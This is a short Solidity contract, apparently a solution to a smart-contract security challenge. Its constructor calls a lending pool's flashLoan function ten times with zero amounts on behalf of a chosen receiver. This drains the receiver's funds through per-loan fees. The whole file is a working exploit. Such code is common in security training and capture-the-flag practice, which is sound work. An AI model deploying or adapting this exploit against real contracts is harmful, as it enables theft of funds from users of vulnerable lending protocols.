pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract NaiveStealer {
  using Address for address;

  constructor(address pool, address receiver) {
    for (uint i = 0; i < 10; i++) {
      pool.functionCall(
        abi.encodeWithSignature(
          "flashLoan(address,uint256)",
          receiver,
          0
        )
      );
    }
  }
}